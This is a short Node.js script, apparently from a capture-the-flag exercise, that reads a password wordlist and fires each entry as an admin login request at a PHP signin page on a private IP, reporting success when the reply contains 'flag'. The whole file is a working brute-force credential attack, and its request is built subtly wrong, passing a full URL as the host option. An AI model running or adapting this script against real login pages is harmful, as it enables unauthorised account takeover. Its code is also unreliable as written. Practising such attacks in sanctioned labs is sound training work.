var fs = require("fs");
const http = require('http');

fs.readFile('Ressources/password.txt', function (err, f) {
    var passwords = f.toString().split('\n');
    passwords.forEach(password => {
        http.get({host: `http://10.12.100.44/index.php?page=signin&username=admin&password=${password}&Login=Login`, timeout:1000}, (resp) => {
            let data = '';
            resp.on('data', (chunk) => {
                data += chunk;
            });
            resp.on('end', () => {
                if(data.includes('flag')){
                    console.log('Success the password is: ', password);
                    return;
                }
                    
                else
                    console.log('Failed : ', password);
            });
        }).on("error", (err) => {
            console.log("Error: " + err.message);
        });
    });

});
